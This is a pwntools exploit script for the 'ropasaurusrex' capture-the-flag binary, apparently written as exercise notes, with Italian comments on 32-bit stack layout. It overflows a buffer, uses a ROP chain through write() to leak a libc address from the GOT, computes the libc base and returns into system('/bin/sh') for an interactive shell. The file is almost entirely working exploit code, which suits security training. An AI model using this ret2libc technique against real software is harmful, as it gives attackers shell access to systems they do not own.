from pwn import*


#fai attenzione ad una cosa: può capitare a volte come in questa challenge che l'ELF del binario sia settato a 32 bit
#cioè le celle dello stack sono di 4 bytes e non di 8 bytes. -> cioè verranno utilizzati dei registri del tipo EAX,EBX,
#che sono la metà dei RDX ecc. -> quindi ho necessità di gadget che usino registri con la "E" iniziale.
p = process("./ropasaurusrex")
#p = remote("bin.training.offdef.it", 2014)

gdb.attach(p,
'''
b *(0x0804841b)
''')

#ho letto questi parametri da Ghidra perchè ho NO PIE
write_addr = 0x0804830c #visto dal .plt
main_addr = 0x0804841d
got_read_addr = 0x0804961c
#nel seip metto il write_addr letto dal plt, poi metto il main e poi parametri della write.

code = b"A"*140 + p32(write_addr) + p32(main_addr) + p32(1) + p32(got_read_addr) + p32(4)

offset = 0xf7d0a0c0 - 0xf7c00000

input("wait")
p.send(code)
#input("wait")
read = p.recv(4)
print(hex(u32(read)))

libc_base = u32(read) - offset

#UNA COSA IMPORTANTE DA SAPERE -> è un modo più veloce per calcolare quello che mi serve della libc.
libc = ELF("./libc-2.35.so")


libc.address = libc_base
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))


final_code = b"A" * 140 + p32(system) + p32(0) + p32(binsh)
p.send(final_code)

p.interactive()